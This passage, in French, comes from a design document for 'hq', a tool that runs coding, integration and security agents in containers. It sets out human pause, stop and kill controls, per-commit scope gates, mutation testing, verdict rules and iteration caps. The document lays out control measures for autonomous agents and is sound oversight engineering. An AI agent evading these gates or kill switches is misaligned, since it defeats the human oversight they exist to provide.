  très large sur un même lot avec du progrès — huit heures par défaut — le HQ
  ne tue pas : il remonte à l'humain que le lot dure, et continue en
  attendant sa réponse.
- **Les causes du harnais restent à part.** Quota, jeton expiré, réseau,
  plantage du harnais : le run est rejoué sans consommer de tentative, avec
  une attente croissante entre deux essais et un plafond d'attente au-delà
  duquel `hq` s'arrête et remonte à l'humain, plutôt que d'attendre une nuit
  sur un jeton révoqué.
- **« Bloqué sur une permission » n'existe plus.** Sans interface, ce qui
  aurait demandé est refusé — la règle « refuser est sûr » tenue par
  construction, aux drapeaux près du tableau ci-dessus.

Fenêtre de checkpoint, cadence de contrôle, tentatives par lot, seuil
d'immobilité, garde-fou de durée : cinq paramètres de `hq.yaml`, l'en-tête de
mission prime. Les valeurs par défaut (45, 15, 3, 3 contrôles, 8 h) sont
héritées de sessions interactives ; en mode sans interface un lot bien
découpé finit souvent avant, et elles se règlent à l'usage.

**Les trois gestes de l'humain sur un agent**, conservés de `claude-setup` et
tranchés par Arnaud le 2026-09-09. Ils s'appliquent au **conteneur**, pas à
un hook que l'agent pourrait ne pas voir, et ils **passent toujours**, verrou
de slot ou pas, depuis n'importe quel terminal — si la session HQ est morte,
l'humain les tape lui-même.

| verbe | ce qu'il fait | ce que l'agent en voit |
|---|---|---|
| `hq mission pause` / `resume` | **gèle** le conteneur de l'agent, tel quel, au milieu de ce qu'il fait ; `resume` le dégèle exactement là | rien : le processus est suspendu par le moteur de conteneurs, aucun état n'est perdu ; un appel réseau en cours vers l'API du modèle peut expirer pendant un long gel, et le harnais le rejoue |
| `hq mission stop` | **arrêt propre** : `hq` ne relancera aucun run ; le run en cours finit son lot, ou s'interrompt tout de suite avec `--now` par le signal qui termine le tour proprement, pour que l'agent écrive son état de reprise — l'ancien fichier `STOP` | sans `--now`, il finit son lot ; avec, son tour est interrompu proprement |
| `hq mission kill` | **frein d'urgence** : le conteneur est tué immédiatement, rien n'est attendu — l'ancien `AGENT_STOP` | rien, il n'existe plus |

`pause` et `stop` laissent le dossier de mission intact et reprenable ; après
un `kill`, le lot en cours est une tentative échouée et la relance repart du
dernier état de reprise écrit.

`say` change de sens avec le run : il n'y a pas de canal pendant un run. Une
consigne est déposée dans `FOLLOWUP_HQ.md` et lue au run suivant ; si elle
presse, `stop --now` termine le run en cours proprement et la relance la
porte.

Ce que ça coûte : plus d'écran à regarder par curiosité (`hq logs` le rend en
lisant la sortie), et une connexion sans interface par harnais, avec un geste
humain une fois par an pour Claude Code, à ranger là où `provision()` monte
le volume du harnais — un jeton révoqué arrête tous les slots d'un coup.

**L'abonnement, et rien d'autre.** Tranché par Arnaud le 2026-09-09. Les
agents Claude Code se connectent avec le **jeton de longue durée de
l'abonnement** (`claude setup-token`), jamais avec une clé d'API. Ce que ça
engage pour l'adaptateur, et qu'il doit tenir explicitement :

- **pas de `--bare`**, aujourd'hui ni quand il deviendra le défaut du mode
  sans interface : `--bare` ignore le jeton d'abonnement et saute
  `CLAUDE.md`. L'adaptateur lance `claude -p` sans lui, et le jour où le
  défaut change, il passe le drapeau inverse. Les tests d'intégration de
  l'adaptateur vérifient ce comportement contre la version installée de la
  CLI, pour que le changement ne passe pas en silence ;
- les règles sont lues par `CLAUDE.md` et son import d'`AGENTS.md`, comme
  prévu en 4.1 ;
- la consommation des agents est prise sur la **fenêtre de l'abonnement**,
  partagée avec la session HQ ; le plafond par mission de la section 7 se
  compte en tokens et en runs, pas en argent, et un quota atteint est une
  cause du harnais (attente croissante, puis l'humain) ;
- l'option d'une clé d'API n'existe pas dans `hq`. Si elle devient nécessaire
  un jour — plusieurs slots qui saturent la fenêtre, un projet d'équipe —
  c'est une décision à reprendre, pas une case à cocher.

Un adaptateur est jetable. Le jour où le harnais change d'affichage ou de
mécanisme, on réécrit l'adaptateur, pas la méthode. Le premier adaptateur est
Claude Code, parce que c'est celui qui existe ; le second est ce qui prouvera
que la frontière tient. Un adaptateur **factice**, qui répond des états
connus sans conteneur, sert aux tests du moteur.

### 4.4 Les portes de vérification

Déterministes. Les portes 1 à 4 sont jouées **à la fin de chaque run**, pas
seulement à la vérification finale — tranché par Arnaud le 2026-09-09 : la revue avait
montré qu'une porte de périmètre qui ne tombe qu'à la
vérification finale perd une mission de six heures pour une écriture interdite au premier
lot. Les portes 5 à 7 sont jouées à la vérification finale, quand le codeur a fini son dernier lot. La première rouge arrête tout.

1. arbre propre ;
2. branche non protégée et en avance sur sa base — si la base a avancé
   pendant la vérification, la branche n'est **jamais rebasée par un agent** :
   `hq push` pousse telle quelle et la pull request porte le conflit, que
   l'humain résout ;
3. le bloc `ÉTAT DE REPRISE` en tête du journal nomme `HEAD` ;
4. périmètre respecté, **sur le diff base..HEAD et commit par commit** (un
   commit interdit puis reverté laisse un arbre propre et une histoire
   sale) : chemins protégés du projet ; zone de tests de la stack pour une
   mission de tests ; et pour l'intégrateur, « câblage » **défini
   mécaniquement** comme la liste de chemins que sa `MISSION.md` déclare
   (configuration, tests système, migrations, fichiers d'infrastructure) —
   tout commit hors de cette liste est hors périmètre ;
5. livrable présent (`PR.md`) ;
6. batterie verte — absente ou non exécutable, la porte **échoue**, elle ne
   saute pas ;
7. **mutation** : campagne jouée sur les fichiers touchés. **Pas de seuil** :
   la porte est verte quand **chaque survivant a reçu une des trois issues**
   écrites par le codeur — tué par un test nommé, démontré équivalent en une
   phrase que le HQ contre-vérifie, ou reconnu comme bug et figé dans un test
   rouge. Un seuil et un triage tiraient en sens contraire, et Google, dont la
   pratique inspire cette porte, ne fait ni score ni seuil. Le retour des
   survivants au codeur est un run de plus sur le lot, pas un volet. Quatre
   particularités, écrites parce qu'elles ne sont pas évidentes : elle tourne
   **dans le conteneur du slot**, lancée par `hq exec` comme une commande
   déterministe déclarée par le fragment de stack, sans session d'agent ; sur
   une **copie git de l'arbre** à l'intérieur du conteneur, jamais sur l'arbre
   de travail, parce que les outils de mutation réécrivent les sources et
   qu'un plantage laisserait un mutant dans le code — et cette copie a **son
   propre cache de build**, chauffé une fois par slot et conservé : pour Rust,
   `cargo-mutants` ne réutilise le cache qu'en place (`--in-place`), donc en
   place sur la copie, jamais sur l'arbre du codeur ; sans cela chaque
   campagne recompile à froid, et la section 7 le compte ; elle est
   **longue**, donc elle se lance et se guette comme un run, avec un délai
   paramétré ; et elle **ne rejoue que si les fichiers touchés ont changé**
   depuis la dernière campagne verte sur cette mission. Son résultat est un
   fichier du dossier de mission que le HQ lit.

Ces sept portes sont celles du **codeur**. La seconde revue a montré
qu'appliquées telles quelles aux deux autres rôles elles étaient indéfinies
ou absurdes — une batterie sans services pour l'intégrateur, une mutation de
tests système, un `PR.md` pour une sécurité qui ne commite pas. Tranché par
Arnaud le 2026-09-09 : **chaque rôle a les portes qui correspondent à ce
qu'il produit.**

| porte | codeur | intégrateur | sécurité |
|---|---|---|---|
| 1 arbre propre | oui | oui | sans objet (arbre en lecture seule) |
| 2 branche non protégée, en avance | oui | oui | sans objet |
| 3 bloc de reprise nomme `HEAD` | oui | oui | oui (son journal) |
| 4 périmètre | chemins protégés, zone de tests si mission de tests | **le câblage seulement** : la liste de chemins de son `MISSION.md` (tests système, configuration de test, fixtures, ordre des migrations) ; tout commit hors liste est hors périmètre | sans objet |
| 5 livrable | `PR.md` | `PR.md` complété de la section intégration | le rapport, dans `VERDICT.json` |
| 6 batterie | oui | **ses tests système verts**, dans le profil système | sans objet |
| 7 mutation | oui | non (des tests système et de la configuration ne se mutent pas) | non |
| sécurité mécanique | audit des dépendances, scan de secrets, analyse statique par stack | idem sur ses commits | sans objet |
| verdict | implicite : portes vertes | `INTEGRATED` / `BROKEN` | `CLEAR` / `FINDINGS` |

**Le verdict et le `HEAD`, quand l'intégrateur commite.** Tranché par Arnaud
le 2026-09-09. La v1 disait « on ne pousse que si les trois verdicts portent
le `HEAD` courant », ce qui est impossible dès que l'intégrateur ajoute un
commit derrière celui du codeur. La règle juste : chaque verdict porte le
commit de **son** rôle, et le verdict du codeur **reste valable tant que tout
ce qui a été ajouté après lui n'est que du câblage de l'intégrateur** passé
par sa porte 4. `hq push` exige donc `INTEGRATED` et `CLEAR` sur le dernier
commit, et le verdict du codeur sur un ancêtre dont la différence ne contient
que des commits de câblage. Un commit après le sien qui touche au code métier
invalide son verdict, et le codeur repart en volet. Sans intégrateur
(`integration: none`), le verdict du codeur est sur le dernier commit et la
règle de l'ancêtre ne sert pas.

Puis, dans l'ordre et selon la forme déclarée : la mission d'**intégration**
(le livrable est connecté à ses infrastructures et les tests système passent,
dans le profil système), puis la mission de **sécurité** (le livrable, intégré
s'il y a des services, est attaqué et le rapport est `CLEAR`). L'ordre n'est
pas arbitraire : on ne pentest pas un système qui n'est pas encore branché.

### 4.5 Le flux d'une mission, et les règles d'itération

Le flux, tranché par Arnaud le 2026-09-08. Il tient en une boucle par étape,
et le HQ est le seul à tenir le volant.

```text
HQ lance le CODEUR (profil mission)
   le codeur travaille par lots, run après run, commite lot après lot,
   jusqu'à la fin de sa mission (portes 1-4 à chaque run, 5-7 et la
   sécurité mécanique à la fin)
[si integration: services]
HQ lève le profil système sur le même slot, lance l'INTÉGRATEUR sur ce HEAD
   ├─ BROKEN  : l'intégrateur écrit son constat dans son journal et son
   │            VERDICT.json ; le HQ reprend la main, le transcrit dans le
   │            FOLLOWUP_HQ.md du codeur, et relance le codeur en volet —
   │            tant que l'intégrateur échoue
   └─ INTEGRATED
[si security: agent]
HQ lance la SÉCURITÉ sur ce HEAD (profil système s'il y a des services, sinon
   profil mission ; arbre en lecture seule)
   ├─ FINDINGS : même principe — journal de la sécurité, le HQ reprend, renvoie
   │             au codeur, et l'intégrateur REJOUE avant la sécurité, puisque
   │             le code a changé
   └─ CLEAR
l'HUMAIN valide ──► hq push : la branche est poussée, la pull request ouverte
```

Une étape absente parce que la forme de la mission ne la déclare pas n'est
pas une étape sautée : elle est **absente par déclaration validée**, et le
résumé de `hq verify` le dit en ces mots. Une porte qui ne peut pas s'exécuter,
elle, échoue toujours.

Ce que la boucle veut dire, et ce qu'elle ne veut pas dire.

- **L'échec revient toujours au codeur.** L'intégrateur et la sécurité ne
  touchent pas au code métier ; ce qu'ils constatent, c'est que le code ne
  tient pas face au réel. Le câblage et l'environnement, l'intégrateur les
  corrige lui-même dans sa mission, run après run, avant de conclure : un
  `BROKEN` dit « le code doit changer », pas « je n'ai pas réussi à brancher ».
- **Le constat vit dans le journal du rôle qui l'a fait**, et c'est le HQ qui
  le porte au codeur, dans son `FOLLOWUP_HQ.md`, daté. L'agent ne parle
  jamais directement à un autre agent : tout passe par le HQ et par des
  fichiers, pour que la perte d'une session ne perde rien.
- **Un verdict vaut pour un `HEAD`.** `VERDICT.json` porte le commit sur
  lequel le rôle a conclu, et `hq` le refuse s'il ne correspond pas au `HEAD`
  réel. Un nouveau commit du codeur rend caducs l'`INTEGRATED` et le `CLEAR`
  précédents : après une correction, l'intégrateur rejoue, puis la sécurité.
  `hq push` refuse sans les deux verdicts sur le `HEAD` courant.
- **Rien ne se pousse en rouge.** Il n'existe pas de drapeau pour passer
  outre. Un constat de sécurité ne se ferme que corrigé, ou démontré faux
  positif en une phrase que le HQ contre-vérifie, ou **accepté comme risque
  par l'humain**. L'acceptation passe par un verbe, `hq mission accept
  <mission> <constat>`, qui l'écrit dans l'état de `hq` et, daté, dans le
  `FOLLOWUP_HQ.md` ; `VERDICT.json` reste `FINDINGS` — c'est l'état qui sait
  que l'humain a levé le constat, et `hq push` le lit là. Aucun agent
  n'accepte un risque.
- **La boucle est bornée, et la borne est un paramètre.** Tranché par Arnaud
  le 2026-09-08 : **trois volets** par défaut. Au troisième retour au codeur
  sur une même mission, le HQ ne relance pas : il s'arrête et remonte à
  l'humain, avec les trois constats côte à côte. La valeur se règle dans
  `hq.yaml` et par mission (`MISSION.md` prime), jamais en dur dans le
  moteur ; la mettre à zéro n'est pas « sans limite » mais « aucune
  itération : le premier rouge remonte ».
- **Un run tombé pour une cause du harnais ne compte pas.** Quota atteint,
  jeton expiré, réseau, plantage : `hq` attend et rejoue le run, sans
  consommer une tentative ni un volet, ni écrire un verdict, avec l'attente
  croissante et le plafond de 4.3. Seul un run fini, ou échoué pour une cause
  de la mission (blocage constaté, contrat non rempli), avance la machine à
  états.

## 5. Pris à l'existant, construit ici

Vérifié le 2026-09-09 par la revue indépendante, sur les pages des projets et
la documentation officielle.

| besoin | candidat existant | verdict |
|---|---|---|
| règles lues par tout harnais | `AGENTS.md` (standard de fait ; Claude Code par import `@AGENTS.md` ou lien, documenté) | **pris** |
| outils exposés à tout harnais | MCP | **pris** pour ce qui doit être appelé par l'agent |
| compétences réutilisables | `SKILL.md`, standard ouvert (agentskills.io), adopté par OpenCode, Codex, Gemini CLI, Cursor, Copilot, Goose, Roo, Kiro, Amp | **pris** |
| slots isolés par agent, multi-harnais | Vibe Kanban (en fin de vie), claude-squad (déprécié en février 2026), Conductor (Mac seulement), Container Use (Dagger, vivant) | **construit ici** (tranché) : aucun ne garantit l'`origin` inatteignable, deux sont morts, et c'est trois appels |
| bac à sable | conteneurs OCI par Compose généré ; devcontainer réduit à une vue IDE ; micro-VM (bacs à sable Docker pour agents, `container` d'Apple : macOS 26 et Apple silicon seulement) pour l'isolation du noyau | **pris** (Compose) ; micro-VM à évaluer un jour pour l'agent sécurité, jamais comme base |
| pilotage par spec, rôles d'agents | spec-kit (GitHub), méthode BMAD | à lire ; BMAD a des rôles (dev, QA…) mais ni intégrateur branché sur de l'infra réelle, ni HQ, ni portes |
| services d'intégration jetables | le fichier Compose des services du projet, fusionné dans le Compose généré par `hq` | **pris**. Pas Testcontainers : il lève des conteneurs depuis le processus de test, donc depuis le conteneur de l'agent, donc avec le socket Docker — ce que 3.2 interdit |
| protocole de mission, contrat de run, reprise à froid | — | **construit ici** : personne ne le livre |
| portes de vérification déterministes | — | **construit ici** |
| HQ comme lieu de décision, journal en trois étages | — | **construit ici** |
| agent sécurité en boucle | outils de scan par stack (audit de dépendances, SAST, fuzzers), à orchestrer | **construit ici** pour l'orchestration, outils pris |
| la règle « refuser est sûr, demander est dangereux » | — | **construit ici**, et à écrire dans chaque adaptateur |

## 6. Ce que cette version ne dit pas encore

- Le format de la prose de `MISSION.md` et de `JOURNAL.md`, à reprendre des
  gabarits existants ; seul l'en-tête structuré est fixé (4.1).
- Le schéma exact de `hq.yaml`, de l'en-tête de mission, de `VERDICT.json`
  et des définitions de profil : leurs champs sont nommés ici, leur forme se
  fixe avec le premier code, et se versionne.
- L'observabilité (Langfuse ou autre), volontairement hors du socle.
- Ce que devient `claude-setup` : gelé dans sa PR #5, référence pour ce que ce
  dépôt reprend.

## 7. Ce que ça coûte, dit une fois

La revue a reproché au brouillon de vendre sans chiffrer. Voici l'addition.

- **Un cycle complet, au pire cas** : une mission codeur, sept portes dont la
  mutation, une mission d'intégration, une mission de sécurité, puis jusqu'à
  trois fois (volet codeur, portes, intégration, sécurité). Sur un projet
  moyen, c'est une journée. La borne de trois volets et la mutation qui ne
  rejoue que sur changement sont ce qui l'empêche de doubler.
- **La consommation** : trois rôles par mission triplent les tokens d'une
  mission solitaire, et tout est pris sur la **fenêtre de l'abonnement**
  d'Arnaud, partagée avec sa session HQ (4.3) : plusieurs slots en parallèle
  la saturent, et la session HQ avec. `hq.yaml` porte un **plafond par
  mission en tokens et en runs** et un comportement en quota atteint
  (attendre, puis remonter à l'humain), parce que sans plafond une boucle
  bornée à trois volets peut encore consommer une nuit de fenêtre. Claude
  Code rend la consommation dans sa sortie structurée ; l'`Outcome` du trait
  la porte.
- **Les tests système sur une vraie API tierce** : lents, instables, à effets
  de bord, et deux missions parallèles partagent le même palier de test et se
  marchent dessus. Une mission d'intégration qui déclare un fournisseur réel
  **verrouille ce fournisseur** pour les autres missions du projet le temps
  de ses runs — un verrou de plus dans l'état de `hq` (4.2), à côté du verrou
  de slot.
- **La connexion sans interface** : un geste humain avec navigateur par
  harnais et par an pour Claude Code, un jeton partagé par tous les slots,
  dont la révocation arrête tout d'un coup.
- **Ce que `hq check` ne voit pas** : la protection de branche côté forge
  sans credential, et ce que l'agent lit dans son propre conteneur. Il le dit
  au lieu de se taire.
